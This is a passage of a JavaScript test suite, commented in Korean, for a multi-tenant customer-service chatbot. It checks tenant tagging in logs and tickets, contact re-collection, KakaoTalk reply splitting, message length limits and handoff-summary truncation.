  const numNew = replyTo('매장 번호 02-123-4567로 전화했는데 안 받아요', 'rt-ds35-num-new');
  assert.notEqual(numNew.intent, 'contact_captured', '고객이 주지 않은 번호를 연락처로 받아 적는다');
  assert.equal(esc.getTicket(fixed.id).contact, '010-1234-5678', '고객이 남긴 연락처가 남의 번호로 덮인다');

  resetSessions();
  esc.resetTickets();
});

/* ══════════ 디자인 스프린트 — 33차 재감사 (DS 36-1·36-2) ══════════ */

/**
 * DS 36-1 — 「어느 고객사의 손님인가」가 대화 기록에 없던 자리.
 *
 * 임베드는 고객사마다 `data-tenant` 로 뜨고, 고객사 위젯은 **그 고객사 자료만** 근거로 답한다
 * (`entriesFor` 는 테넌트가 있으면 `tenant.kb` 만 본다). 그런데 테넌트는 요청 로그에만 남아
 * 대화 기록에는 한 글자도 들어가지 않았다 — 최근 대화·내려받기·대시보드가 이음 손님의 말과
 * 고원 홈페이지 손님의 말을 한 줄에 섞었고, 「답하지 못한 질문」은 **고칠 자료가 다른 곳에 있는**
 * 두 묶음을 하나로 세어 운영자를 엉뚱한 자료로 데려갔다. 묶음이 실제로 갈라지는지는 돌려 봐야 안다.
 */
test('대화 기록이 어느 고객사에서 왔는지 말하고, 못 답한 질문을 고객사별로 가른다 (DS 36-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const { logTurn, convStats, unansweredQuestions, resetLogs, importTurns, exportTurns } = await importLib('convlog', CONVLOG_DEPS);
  resetLogs();

  const turn = (sessionId, tenant, message, source = 'fallback') =>
    logTurn({ sessionId, channel: 'web', tenant, message, reply: '답', intent: 'fallback', source, escalate: false });

  // ① 적은 그대로 남는다. 기본 구성은 null 이고, 빈 문자열도 null 로 모은다(두 가지 「없음」을 만들지 않는다).
  assert.equal(turn('s-eum', 'eum', '활동확인서 언제 나와요').tenant, 'eum');
  assert.equal(turn('s-base', null, '요금 알려주세요').tenant, null);
  assert.equal(
    logTurn({ sessionId: 's-x', channel: 'web', tenant: '', message: 'a', reply: 'b', intent: 'i', source: 'kb', escalate: false }).tenant,
    null,
  );

  // ② **같은 문장**이어도 고객사가 다르면 다른 묶음이다 — 고칠 자료가 다른 곳에 있다.
  resetLogs();
  turn('s1', 'eum', '환불 되나요?');
  turn('s2', 'eum', '환불되나요?');
  turn('s3', null, '환불 되나요?');
  const u = unansweredQuestions();
  assert.equal(u.groups, 2, '고객사가 다른 질문이 한 묶음으로 섞였다');
  assert.equal(u.turns, 3, '묶기 전의 총 횟수는 그대로여야 한다');
  const eumItem = u.items.find((i) => i.tenant === 'eum');
  const baseItem = u.items.find((i) => i.tenant === null);
  assert.equal(eumItem.count, 2, '같은 고객사 안에서는 띄어쓰기가 달라도 한 묶음이다');
  assert.equal(baseItem.count, 1);
  // 어느 고객사 묶음인지 항목이 스스로 말한다 — 화면은 이 값으로 「자료 만들기」를 줄지 말지 가린다.
  assert.equal(u.items.every((i) => 'tenant' in i), true, '항목이 고객사를 들고 있지 않다');

  // ③ 대시보드에 고객사별 수치가 생긴다(종전에는 전부 합친 한 줄뿐이었다).
  resetLogs();
  turn('s1', 'eum', 'a');
  turn('s1', 'eum', 'b');
  turn('s2', 'eum', 'c');
  turn('s9', null, 'd');
  const stats = convStats();
  assert.equal(stats.byTenant.length, 2);
  assert.deepEqual(stats.byTenant[0], { tenant: 'eum', turns: 3, sessions: 2, escalated: 0 }, '대화 많은 고객사가 앞이어야 한다');
  assert.deepEqual(stats.byTenant[1], { tenant: null, turns: 1, sessions: 1, escalated: 0 });
  // 합계는 종전과 같다 — 가르는 것이지 수를 바꾸는 것이 아니다.
  assert.equal(stats.byTenant.reduce((s, b) => s + b.turns, 0), stats.totalTurns);

  // ④ 옛 백업에는 고객사가 없다 — 지어내지 않고 기본 구성(null)으로 둔다.
  const snap = exportTurns();
  for (const t of snap.turns) delete t.tenant;
  assert.equal(importTurns(snap).ok, true);
  assert.equal(convStats().byTenant.length, 1, '없는 고객사를 지어냈다');
  assert.equal(convStats().byTenant[0].tenant, null);

  resetLogs();
});

/**
 * DS 36-2 — 접수가 **어느 회사 손님인지** 말하지 않던 자리.
 *
 * 이음 위젯은 답을 못 찾으면 「담당 코디네이터에게 연결해 드릴게요」라고 약속하고 끝난다.
 * 그 접수가 고원 콘솔의 한 큐에 다른 고객사 접수와 섞여 들어오는데 티켓에는 고객사가 없었고,
 * 상담원이 그대로 읽는 이관 요약에도 없었다 — 전화를 걸기 전에 가장 먼저 알아야 하는 값이다.
 */
test('접수와 이관 요약이 어느 고객사의 손님인지 말한다 (DS 36-2)', opts, async () => {
  const GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { getSession, resetSessions } = await pick('session');
  const esc = await pick('escalation');
  const { tenantLabel, resolvedTenantId, DEFAULT_TENANT_LABEL, UNKNOWN_TENANT_LABEL } = await pick('tenants');

  resetSessions();
  esc.resetTickets();

  // ① 이음 위젯에서 상담원을 부르면 접수가 이음 것으로 남는다 — 위젯이 따로 보내 주지 않아도 된다
  //    (답을 만든 자리에서 세션에 적히고, 접수는 세션이 말하는 대로 적는다).
  const r = replyTo('담당자 연결해 주세요', 'rt-ds36-eum', 'eum');
  assert.equal(r.escalate, true, '상담원 전환이 일어나야 이 검증이 의미가 있다');
  assert.equal(getSession('rt-ds36-eum').tenantId, 'eum', '세션이 고객사를 기억하지 않는다');
  const t = esc.getTicket(r.ticketId);
  assert.equal(t.tenant, 'eum', '접수에 고객사가 없다 — 상담원이 어느 회사 이름으로 인사할지 모른다');
  // 상담원이 그대로 읽는 평문에도 있어야 한다. 코드(`eum`)가 아니라 이름이다.
  assert.match(t.summary, /고객사: 이음/, '이관 요약이 고객사를 말하지 않는다');
  assert.equal(t.summary.includes('eum'), false, '요약에 내부 식별자가 그대로 들어갔다');

  // ② 기본 구성의 접수에는 그 줄을 세우지 않는다 — 보탤 사실이 없는 줄을 모든 요약에 넣지 않는다.
  const base = replyTo('상담원 연결해 주세요', 'rt-ds36-base');
  const bt = esc.getTicket(base.ticketId);
  assert.equal(bt.tenant, undefined, '기본 구성인데 고객사가 적혔다');
  assert.equal(bt.summary.includes('고객사:'), false);

  // ③ 등록되지 않은 `data-tenant` 로 들어오면 엔진은 기본 자료로 답한다 — 기록도 그렇게 적어야
  //    기록이 답한 근거와 어긋나지 않는다(요청에 실려 온 문자열을 그대로 믿지 않는다).
  assert.equal(resolvedTenantId('acme'), null);
  assert.equal(resolvedTenantId('eum'), 'eum');
  assert.equal(resolvedTenantId('../eum'), null, '형식이 어긋난 값을 받아들였다');
  const unknown = replyTo('상담원 연결해 주세요', 'rt-ds36-unknown', 'acme');
  assert.equal(esc.getTicket(unknown.ticketId).tenant, undefined, '등록되지 않은 고객사 이름으로 기록됐다');

  // ④ 이름을 붙이는 쪽은 한 곳이다 — 모르는 값도 코드로 내보내지 않는다(DS 22-x 와 같은 규칙).
  assert.equal(tenantLabel(null), DEFAULT_TENANT_LABEL);
  assert.equal(tenantLabel(undefined), DEFAULT_TENANT_LABEL);
  assert.equal(tenantLabel('eum'), '이음');
  assert.equal(tenantLabel('acme'), UNKNOWN_TENANT_LABEL);
  assert.equal(/[A-Za-z]/.test(UNKNOWN_TENANT_LABEL), false, '표시명에 영문 코드가 남았다');

  // ⑤ 「응답 테스트」는 같은 세션으로 기준을 바꿔 가며 시험한다 — 기본 구성으로 돌아가면
  //    적어 둔 고객사를 거둔다(거두지 않으면 기본 구성 시험의 접수가 이음 것으로 기록된다).
  replyTo('안녕하세요', 'rt-ds36-switch', 'eum');
  assert.equal(getSession('rt-ds36-switch').tenantId, 'eum');
  replyTo('안녕하세요', 'rt-ds36-switch');
  assert.equal(getSession('rt-ds36-switch').tenantId, undefined, '기준을 바꿨는데 앞서 고른 고객사가 남았다');

  resetSessions();
  esc.resetTickets();
});

/* ══════════ 디자인 스프린트 — 34차 재감사 (DS 37-1·37-2·37-3) ══════════ */

/**
 * DS 37-1 — 서버가 **이미 받은 연락처를 다시 묻던** 자리.
 *
 * 열린 접수는 세션당 재사용된다(`createTicket`). 그런데 접수 안내를 하는 두 자리
 * (`escalateWith`·`maybeAutoEscalate`)는 조건 없이 `awaitingContact` 를 켰다 — 이미 연락처를
 * 남긴 사람이 다시 「상담원」이라고 말하면 서버가 아는 번호를 서버가 다시 묻는다. 그 물음은
 * **다음 한 턴을 삼킨다**: 보통 질문이 연락처 수집 턴으로 먼저 해석되어 「…없어요?」는 건너뛰기로
 * 읽히고, 문장에 섞인 남의 번호는 고객이 남긴 번호를 **덮어쓴다**(DS 35-3 이 카드 쪽에서 고친
 * 해가 대화창 쪽 문으로 그대로 돌아온다). 「정말 그렇게 되는가」는 돌려 봐야 안다.
 */
test('이미 받은 연락처를 서버가 다시 묻지 않는다 (DS 37-1)', opts, async () => {
  const GROUP = ['chat', 'session', 'handoff', 'intents', 'rules', 'escalation', 'adminStore', 'knowledge', 'normalize', 'storage', 'slots', 'tenantKB', 'tenants', 'llm'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const { replyTo } = await pick('chat');
  const { getSession, updateSession, resetSessions } = await pick('session');
  const esc = await pick('escalation');

  const sid = 'rt-ds37-again';
  resetSessions();
  esc.resetTickets();

  // 전제 — 접수하고 연락처까지 남긴 사람(서버가 묻고 고객이 답한 길).
  const first = replyTo('상담원 연결해 주세요', sid);
  assert.equal(getSession(sid).awaitingContact, true, '첫 접수에는 연락처를 물어야 한다 — 전제가 깨졌다');
  assert.equal(replyTo('010-1234-5678', sid).intent, 'contact_captured');
  assert.equal(esc.getTicket(first.ticketId).contact, '010-1234-5678');

  // ① 같은 대화에서 다시 상담원을 부르면 — 받은 것을 다시 달라고 하지 않고 **어디로 연락할지**를 말한다.
  const again = replyTo('상담원 연결해 주세요', sid);
  assert.equal(again.ticketId, first.ticketId, '열린 접수가 재사용되지 않았다 — 전제가 깨졌다');
  assert.equal(Boolean(getSession(sid).awaitingContact), false, '서버가 이미 아는 연락처를 다시 묻는다');
  assert.match(again.reply, /010-\*\*\*\*-5678/, '어디로 연락하는지 말하지 않는다');
  assert.equal(again.reply.includes('010-1234-5678'), false, '연락처 원문이 대화 기록·운영자 화면에 그대로 남는다');
  assert.equal(/남겨주시면|남겨주시|남기시면/.test(again.reply), false, '받은 것을 다시 달라고 한다');

  // ② 그 물음이 삼키던 다음 턴 — 보통 질문이 「건너뛰기」로 읽히지 않는다.
  assert.notEqual(replyTo('환불 수수료는 없어요?', sid).intent, 'contact_skipped', '질문이 사라지고 접수 안내만 남는다');

  // ③ 문장에 섞인 **남의 번호**가 고객 연락처를 덮지 않는다.
  replyTo('상담원 연결해 주세요', sid);
  const other = replyTo('매장 번호 02-123-4567로 전화했는데 안 받아요', sid);
  assert.notEqual(other.intent, 'contact_captured', '고객이 주지 않은 번호를 연락처로 받아 적는다');
  assert.equal(esc.getTicket(first.ticketId).contact, '010-1234-5678', '고객이 남긴 연락처가 남의 번호로 덮였다');

  // ④ 종전 동작(조건 없이 묻기)에서는 ②③이 실제로 일어난다 — 재현되지 않으면 ②③은 아무것도 지키지 않는다.
  updateSession(sid, { awaitingContact: true });
  assert.equal(replyTo('환불 수수료는 없어요?', sid).intent, 'contact_skipped', '이 결함이 재현되지 않는다');
  updateSession(sid, { awaitingContact: true });
  assert.equal(replyTo('매장 번호 02-123-4567로 전화했는데 안 받아요', sid).intent, 'contact_captured', '이 결함이 재현되지 않는다');
  assert.equal(esc.getTicket(first.ticketId).contact, '02-123-4567', '덮어쓰기가 재현되지 않는다');

  // ⑤ 묻지 않는 대신 **번호만** 보내면 바꿔 준다(마음이 바뀐 사람의 길 — 문장에 섞인 번호는 ③처럼 받지 않는다).
  const changed = replyTo('010-9999-8888', sid);
  assert.equal(changed.intent, 'contact_updated');
  assert.equal(esc.getTicket(first.ticketId).contact, '010-9999-8888', '번호만 보냈는데 바뀌지 않았다');
  assert.match(changed.reply, /010-\*\*\*\*-8888/);
  assert.equal(changed.reply.includes('010-9999-8888'), false, '바뀐 번호 원문이 대화 기록에 남는다');

  // ⑥ 자동 전환(신뢰도 미달 연속)도 같은 규칙을 따른다 — 접수에 연락처가 있으면 묻지 않는다.
  const sid2 = 'rt-ds37-auto';
  const t2 = replyTo('상담원 연결해 주세요', sid2);
  replyTo('hong@example.com', sid2);
  assert.equal(esc.getTicket(t2.ticketId).contact, 'hong@example.com', '전제가 깨졌다');
  replyTo('zzzz qqqq', sid2);
  const auto = replyTo('xxxx yyyy', sid2);
  assert.equal(auto.ticketId, t2.ticketId, '자동 전환이 일어나지 않았다 — 전제가 깨졌다');
  assert.equal(Boolean(getSession(sid2).awaitingContact), false, '자동 전환이 아는 연락처를 다시 묻는다');
  assert.match(auto.reply, /ho\*\*\*@example\.com/, '어디로 연락하는지 말하지 않는다');

  resetSessions();
  esc.resetTickets();
});

/**
 * DS 37-2·37-3 — **버튼이 없는 창구**(카카오)의 화면 전체가 이 어댑터 한 함수다.
 *
 * 37-2: 「상담원 연결」 quickReply 판정이 **이번 턴**(`result.ticketId`)만 봤다. 이미 접수한
 *        사람에게도 버튼이 계속 떠, 누르면 서버가 접수를 재사용하면서 연락처를 다시 묻는다
 *        (위젯은 DS 35-2 에서 「접수번호를 들고 있는가」로 바꿔 고친 자리다).
 * 37-3: `body.slice(0, 1000)` — 1000자가 넘는 답은 **말 중간에서 잘리고**, 뒤에 붙인 근거가
 *        가장 먼저 사라졌다. 고객은 잘린 줄도 모른다(자료 항목은 길이 제한이 없다 — 문서
 *        인제스트는 문단 하나를 그대로 답으로 만든다).
 */
test('카카오 응답이 접수한 사실을 알고, 긴 답을 말 중간에서 자르지 않는다 (DS 37-2·37-3)', opts, async () => {
  const { toKakaoResponse, splitKakaoText, KAKAO_TEXT_LIMIT, KAKAO_OUTPUT_LIMIT } = await importLib('kakao', ['webhookAuth']);
  const base = { reply: '네, 도와드릴게요.', intent: 'fallback', source: 'fallback', escalate: true, confidence: 0.15 };
  const texts = (res) => res.template.outputs.map((o) => o.simpleText.text);

  // ① 접수 전에는 종전대로 상담원 연결을 권한다.
  assert.deepEqual(toKakaoResponse(base).template.quickReplies, [{ label: '상담원 연결', action: 'message', messageText: '상담원' }]);

  // ② 접수한 뒤에는 권하지 않고 **접수번호를 글자로** 알린다(버튼을 숨길 화면이 없는 창구다).
  //    어댑터가 받는 값은 번호가 아니라 **지금 모습**이다(DS 51-3) — 뜻은 그대로, 모양만 옮겼다.
  const open7 = { id: 'ESC-0007', closed: false, contactOnFile: true };
  const after = toKakaoResponse(base, { filedTicket: open7 });
  assert.equal(after.template.quickReplies, undefined, '접수한 사람에게 접수를 다시 권한다');
  assert.match(texts(after)[0], /이미 접수번호 ESC-0007/, '접수한 사실을 알리지 않는다');

  // ③ 이번 턴에 접수된 답변은 본문이 이미 접수번호를 말한다 — 같은 말을 두 번 하지 않는다.
  const now = toKakaoResponse({ ...base, ticketId: 'ESC-0007', reply: '접수번호는 ESC-0007입니다.' }, { filedTicket: open7 });
  assert.equal(texts(now)[0].includes('이미 접수번호'), false, '방금 한 말을 한 번 더 한다');
  assert.equal(now.template.quickReplies, undefined);

  // ④ 짧은 답은 종전 모습 그대로 — 한 말풍선에 본문 + 근거 한 줄.
  const cited = toKakaoResponse({ ...base, escalate: false, citation: { source: '요금 안내' } });
  assert.equal(texts(cited).length, 1);
  assert.match(texts(cited)[0], /근거: 요금 안내/);

  // ⑤ 1000자가 넘는 답 — 종전 식에서는 근거가 **가장 먼저** 사라지고 말 중간에서 끊겼다.
  const para = (n) => (`${n}번째 문단입니다. ` + '안내 문구가 이어집니다. '.repeat(14)).trim();
  const paras = [1, 2, 3, 4, 5, 6, 7, 8].map(para);
  const long = paras.join('\n\n');
  assert.ok(long.length > KAKAO_TEXT_LIMIT && long.length <= KAKAO_TEXT_LIMIT * 2, `검증 전제가 깨졌다(${long.length}자)`);
  const oldWay = `${long}\n\n근거: 요금 안내`.slice(0, 1000);
  assert.equal(oldWay.includes('근거:'), false, '종전 결함이 재현되지 않는다 — 이 검증은 아무것도 지키지 않는다');
  assert.equal(paras.some((p) => oldWay.endsWith(p)), false, '종전 식이 말 중간에서 끊지 않는다');

  const res = toKakaoResponse({ ...base, escalate: false, reply: long, citation: { source: '요금 안내' } });
  const out = texts(res);
  assert.ok(out.length > 1 && out.length <= KAKAO_OUTPUT_LIMIT, `말풍선 수가 규격을 벗어났다(${out.length})`);
  for (const t of out) assert.ok(t.length <= KAKAO_TEXT_LIMIT, `말풍선이 상한을 넘었다(${t.length}자)`);
  assert.equal(out[out.length - 1], '근거: 요금 안내', '근거가 제 말풍선으로 남지 않았다');
  // 끊은 자리는 문단 경계다 — 글자 중간에서 끊지 않는다.
  for (const t of out.slice(0, -1)) for (const p of t.split('\n\n')) assert.ok(paras.includes(p), '문단 중간에서 끊겼다');
  assert.equal(out.slice(0, -1).join('\n\n'), long, '본문 일부가 조용히 사라졌다');

  // ⑥ 세 말풍선에도 담기지 않으면 **잘랐다고 말한다**(삼키지 않는다 — §3).
  const huge = Array.from({ length: 40 }, (_, i) => para(i + 1)).join('\n\n');
  const big = texts(toKakaoResponse({ ...base, escalate: false, reply: huge, citation: { source: '요금 안내' } }));
  assert.equal(big.length, KAKAO_OUTPUT_LIMIT);
  for (const t of big) assert.ok(t.length <= KAKAO_TEXT_LIMIT, `말풍선이 상한을 넘었다(${t.length}자)`);
  assert.match(big[big.length - 2], /답변이 길어/, '잘렸는데 아무 말도 하지 않는다');
  assert.match(big[big.length - 2], /상담원/, '이 창구에는 「더 보기」가 없다 — 다음 길을 주어야 한다');
  assert.equal(big[big.length - 1], '근거: 요금 안내', '잘릴 때 근거부터 버린다');

  // ⑦ 나누는 규칙 자체 — 끊을 자리가 없어도 상한을 넘기지 않고, 짧은 글은 그대로 한 칸이다.
  const noBreak = splitKakaoText('ㄱ'.repeat(2500), 100, 2);
  assert.equal(noBreak.cut, true);
  assert.equal(noBreak.parts.length, 2);
  for (const p of noBreak.parts) assert.ok(p.length <= 100, `끊을 자리가 없을 때 상한을 넘겼다(${p.length}자)`);
  assert.deepEqual(splitKakaoText('짧은 답.', 100, 3), { parts: ['짧은 답.'], cut: false });
  assert.deepEqual(splitKakaoText('   ', 100, 3), { parts: [], cut: false });
  // 줄바꿈이 있으면 그 자리에서 끊는다(문장 중간보다 낫다).
  const lines = splitKakaoText(`${'가'.repeat(60)}\n${'나'.repeat(60)}`, 100, 2);
  assert.equal(lines.parts[0], '가'.repeat(60));
  assert.equal(lines.parts[1], '나'.repeat(60));
});

/* ══════════ 디자인 스프린트 — 35차 재감사 (DS 38-1·38-2·38-3) ══════════ */

/**
 * DS 38-1 — **같은 말을 창구에 따라 다르게 받던** 자리.
 *
 * 웹은 2000자를 넘기면 거절하고 위젯이 보내기 전에 글자 수로 알리는데(DS 5-5), 카카오는
 * `parseKakaoPayload` 가 발화를 그대로 받았다 — 상한이 0건이었다. 그 발화는 세션 턴 버퍼(12턴)·
 * 이관 요약으로 흘러간다. 잘라서 받는 것도 답이 아니다: 고객은 자기 말이 줄어든 줄 모른 채
 * **묻지 않은 질문에 대한 답**을 받는다. 그래서 상한을 한 곳에 세우고, 넘으면 말한다.
 */
test('창구가 달라도 같은 말을 같게 받는다 (DS 38-1)', opts, async () => {
  const GROUP = ['kakao', 'limits', 'webhookAuth'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const { parseKakaoPayload, KAKAO_UTTERANCE_LIMIT, KAKAO_TOO_LONG_TEXT } = await pick('kakao');
  const { MAX_MESSAGE_LEN, clip, CLIP_MARK } = await pick('limits');

  // 상한의 출처는 하나다 — 웹 라우트가 쓰는 값과 같은 값이어야 한다.
  assert.equal(KAKAO_UTTERANCE_LIMIT, MAX_MESSAGE_LEN, '창구마다 상한이 다르면 같은 말을 다르게 받는다');

  const say = (u) => parseKakaoPayload({ userRequest: { utterance: u, user: { id: 'kko-1' } } });

  // 상한까지는 그대로 받는다(경계 포함).
  const okEdge = say('가'.repeat(MAX_MESSAGE_LEN));
  assert.equal(okEdge.ok, true, '상한과 같은 길이를 거절했다');
  assert.equal(okEdge.utterance.length, MAX_MESSAGE_LEN, '받은 말을 줄였다');
  assert.equal(okEdge.userId, 'kko-1');

  // 상한을 넘으면 **거절하고 사유를 값으로 돌려준다** — 「확인하지 못했어요」와 같은 말이 아니다.
  const over = say('가'.repeat(MAX_MESSAGE_LEN + 1));
  assert.equal(over.ok, false, '상한을 넘긴 발화를 그대로 받았다');
  assert.equal(over.reason, 'too_long');
  assert.equal(say('   ').reason, 'empty', '빈 발화와 긴 발화를 구분하지 못한다');
  assert.equal(say(null).reason, 'empty');

  // 종전 식(상한 없음)이라면 5000자 발화가 엔진까지 그대로 들어갔다 — 그 사실을 고정한다.
  assert.equal(say('가'.repeat(5000)).ok, false, '종전처럼 길이를 묻지 않고 받는다');

  // 거절은 화면의 일이다 — 상한을 사람 말로 알리고 다음 길을 준다(코드 어휘·영문 금지).
  assert.match(KAKAO_TOO_LONG_TEXT, /2,000자/, '상한을 숫자로 알려야 고객이 나눠 보낼 수 있다');
  assert.match(KAKAO_TOO_LONG_TEXT, /나눠 보내/, '다음 길을 주지 않는다');
  assert.equal(/utterance|too_long|MAX_/.test(KAKAO_TOO_LONG_TEXT), false, '거절 문장에 코드가 남았다');

  // 자르는 자리의 공통 규칙 — 상한 이하는 그대로, 넘으면 표시를 남기고 길이는 상한을 지킨다.
  assert.equal(clip('가'.repeat(10), 10), '가'.repeat(10), '상한과 같은 길이에 표시를 붙였다');
  const cut = clip('가'.repeat(50), 20);
  assert.equal(cut.length, 20, `자른 결과가 상한을 넘었다(${cut.length}자)`);
  assert.ok(cut.endsWith(CLIP_MARK), '잘랐는데 표시를 남기지 않았다');
  assert.equal(clip('가'.repeat(50), 3), '가가가', '상한이 표시보다 짧으면 표시 없이 자른다');
  assert.equal(clip(null, 10), '');
});

/**
 * DS 38-2 — 이관 요약이 **꼬리부터** 잘려 「개인정보 마스킹」 줄과 최근 대화가 사라지던 자리.
 *
 * 종전에는 완성된 평문을 접수 저장 직전에 `slice(0, 4000)` 했다. 이 평문의 꼬리는 마스킹 줄과
 * 가장 최근 대화다 — 상담원이 읽는 요약이 말 중간에서 끝나고, 개인정보가 가려졌는지조차 알 수
 * 없었다(웹 2000자 × 6턴이면 지금도 넘는다). **종전 결함이 실제로 일어나는지**를 먼저 보고,
 * 고친 쪽이 상한 안에서 무엇을 지키는지를 본다.
 */
test('이관 요약은 꼬리가 아니라 오래된 대화를 줄인다 (DS 38-2)', opts, async () => {
  const GROUP = ['handoff', 'intents', 'rules', 'limits'];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const { buildHandoffSummary, renderSummaryText } = await pick('handoff');
  const { SUMMARY_TEXT_LEN, SUMMARY_LINE_LEN, CLIP_MARK } = await pick('limits');

  // 웹 상한(2000자)짜리 말 12턴 — 세션 턴 버퍼가 실제로 들고 있을 수 있는 최대치다.
  const turns = Array.from({ length: 12 }, (_, i) => ({
    at: `2026-10-15T0${i < 10 ? i : 9}:00:00.000Z`,
    speaker: i % 2 === 0 ? 'customer' : 'bot',
    text: `${i + 1}번째 말입니다. ${'환불 규정을 다시 확인하고 싶어요. '.repeat(70)}`,
    ...(i === 10 ? { intent: 'refund' } : {}),
  }));
  const s = buildHandoffSummary({
    sessionId: 'web_limit_1',
    ticketId: 'ESC-0042',
    channel: 'web',
    reason: 'customer_request',
    turns,
    slots: { contact: '010-1234-5678', symptom: `앱이 멈춥니다. ${'같은 화면이 반복됩니다. '.repeat(60)}` },
    recentTurns: 12,
  });

  // ① 종전 결함 재현 — 예산을 두지 않고 만든 평문을 4000자에서 자르면 마스킹 줄이 사라진다.
  const unbudgeted = renderSummaryText(s, Number.MAX_SAFE_INTEGER);
  assert.ok(unbudgeted.length > SUMMARY_TEXT_LEN, `검증 전제가 깨졌다(${unbudgeted.length}자)`);
  const oldWay = unbudgeted.slice(0, SUMMARY_TEXT_LEN);
  assert.equal(oldWay.includes('개인정보 마스킹'), false, '종전 결함이 재현되지 않는다 — 이 검증은 아무것도 지키지 않는다');
  assert.equal(oldWay.endsWith(unbudgeted.slice(-1)), false, '종전 식이 꼬리를 버리지 않는다');

  // ② 고친 쪽 — 상한을 지키면서 마스킹 줄과 **가장 최근 대화**를 남긴다.
  assert.ok(s.text.length <= SUMMARY_TEXT_LEN, `요약이 상한을 넘었다(${s.text.length}자)`);
  assert.match(s.text, /개인정보 마스킹: .*휴대폰 번호/, '마스킹 줄이 사라졌다');
  assert.ok(s.text.trimEnd().endsWith(s.text.trimEnd().split('\n').pop()), '요약이 말 중간에서 끝났다');
  assert.equal(s.text.split('\n').pop().startsWith('개인정보 마스킹:'), true, '마스킹 줄이 마지막이 아니다');
  assert.match(s.text, /12번째 말입니다/, '가장 최근 대화가 빠졌다');

  // ③ 줄인 사실을 수로 말한다 — 「앞선 대화 N줄」(삼키지 않는다).
  const notice = s.text.split('\n').find((l) => l.includes('앞선 대화'));
  assert.ok(notice, '오래된 대화를 줄였는데 아무 말도 하지 않는다');
  const dropped = Number(/앞선 대화 (\d+)줄/.exec(notice)?.[1]);
  assert.ok(dropped > 0 && dropped < 12, `줄인 줄 수가 이상하다(${dropped})`);
  const shown = s.text.split('\n').filter((l) => /^ {2}\[(고객|AI|상담원)\]/.test(l));
  assert.equal(shown.length + dropped, 12, '보여 준 줄과 줄인 줄의 합이 전체와 다르다');

  // ④ 한 줄도 통째로 길면 **표시를 남기고** 줄인다 — 폼 답변·고객의 말은 길이에 제한이 없다.
  for (const l of shown) assert.ok(l.length <= SUMMARY_LINE_LEN + 12, `대화 한 줄이 너무 길다(${l.length}자)`);
  assert.ok(shown.some((l) => l.includes(CLIP_MARK)), '긴 말을 줄였는데 표시가 없다');
  const slotLine = s.text.split('\n').find((l) => l.includes('증상:'));
  assert.ok(slotLine.includes(CLIP_MARK), '수집 정보의 긴 값을 조용히 버렸다');

  // ⑤ 마스킹 집계는 **줄이기 전 원문 전체**를 본다(화면에서 줄였다고 사실이 줄지는 않는다).
  assert.deepEqual(s.piiKinds, ['phone']);

  // ⑥ 짧은 요약은 종전 모습 그대로 — 예산이 남으면 아무것도 줄이지 않는다.
  const small = buildHandoffSummary({
    sessionId: 'web_limit_2',
    channel: 'kakao',
    reason: 'max_retry',
    turns: [{ at: '2026-10-15T01:00:00.000Z', speaker: 'customer', text: '사람 바꿔 주세요' }],
    slots: {},
  });
  assert.equal(small.text.includes('앞선 대화'), false, '줄일 것이 없는데 줄였다고 말한다');
  assert.equal(small.text.includes(CLIP_MARK), false, '짧은 말에 표시를 붙였다');
  assert.match(small.text, /\[고객\] 사람 바꿔 주세요/);
  assert.match(small.text, /개인정보 마스킹: 해당 없음/);
});

/**
 * DS 38-3 — 남기는 말이 **말없이** 잘리던 자리(대화 기록 500자·접수 본문 300자·메모 500자).
 *
 * 운영자는 「환불 수수료가 궁금한데 저번에 주문한」에서 고객이 거기서 멈춘 것인지 우리가 버린
 * 것인지 알 수 없다. 그 글은 「답하지 못한 질문」 목록·내려받기 CSV 로 나가 새 안내 자료의
 * 원문이 되고, 접수 본문이 되어 상담원이 전화하기 전에 읽는 문장이 된다.
 */
test('기록에 남기며 자른 말은 잘랐다고 표시한다 (DS 38-3)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  // 세 모듈을 한 컴파일 묶음으로 가져온다(캐시 키가 같아야 tsc 가 한 번만 돈다).
  const GROUP = ['convlog', 'escalation', 'limits', ...CONVLOG_DEPS];
  const pick = (name) => importLib(name, GROUP.filter((n) => n !== name));
  const { logTurn, resetLogs, listTurns } = await pick('convlog');
  const { TURN_TEXT_LEN, TICKET_MESSAGE_LEN, TICKET_NOTE_LEN, CLIP_MARK } = await pick('limits');
  resetLogs();

  const long = (n) => `질문이 있습니다. ${'같은 내용을 길게 적습니다. '.repeat(n)}`;
  logTurn({ sessionId: 's-38', channel: 'web', tenant: null, message: long(60), reply: long(60), intent: 'fallback', source: 'fallback', escalate: true });
  const [turn] = listTurns(1);
  assert.ok(turn.message.length <= TURN_TEXT_LEN, `대화 기록이 상한을 넘었다(${turn.message.length}자)`);
  assert.ok(turn.message.length > TURN_TEXT_LEN - 20, `표시를 붙이며 지나치게 줄였다(${turn.message.length}자)`);
  assert.ok(turn.message.endsWith(CLIP_MARK), '고객의 말을 줄이고 아무 표시도 남기지 않았다');
  assert.ok(turn.reply.endsWith(CLIP_MARK), '답변을 줄이고 아무 표시도 남기지 않았다');

  // 상한 이하는 **종전 그대로** — 짧은 말에 표시가 붙으면 그것도 거짓이다.
  logTurn({ sessionId: 's-38', channel: 'web', tenant: null, message: '환불 되나요?', reply: '네, 됩니다.', intent: 'refund', source: 'kb', escalate: false });
  const [short] = listTurns(1);
  assert.equal(short.message, '환불 되나요?');
  assert.equal(short.reply.includes(CLIP_MARK), false);
  resetLogs();

  const esc = await pick('escalation');
  esc.resetTickets();
  const { ticket } = esc.createTicket({ sessionId: 's-38', tenant: null, reason: 'user_request', message: long(60) });
  assert.ok(ticket.message.length <= TICKET_MESSAGE_LEN, `접수 본문이 상한을 넘었다(${ticket.message.length}자)`);
  assert.ok(ticket.message.length > TICKET_MESSAGE_LEN - 20, `표시를 붙이며 지나치게 줄였다(${ticket.message.length}자)`);
  assert.ok(ticket.message.endsWith(CLIP_MARK), '접수 본문을 줄이고 아무 표시도 남기지 않았다');

  const noted = esc.updateTicket(ticket.id, { note: long(60) });
  assert.equal(noted.ok, true);
